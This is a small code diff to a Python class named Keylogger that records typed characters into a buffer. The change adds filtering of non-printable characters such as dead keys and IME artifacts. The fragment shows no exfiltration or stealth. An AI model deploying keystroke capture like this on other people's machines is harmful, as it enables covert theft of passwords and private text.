@@ -159,7 +159,11 @@ class Keylogger:
                 elif key == Key.tab:
                     self._buffer += "\t"
                 elif hasattr(key, "char") and key.char is not None:
-                    self._buffer += key.char
+                    ch = key.char
+                    # Filter non-printable characters (dead keys, IME artifacts,
+                    # compose sequences) that would display as □ squares.
+                    if ch and (ch.isprintable() or ord(ch) > 31):
+                        self._buffer += ch
                 # Ignore modifier keys (Shift, Ctrl, Alt, Win, etc.)
 
         except Exception as e:
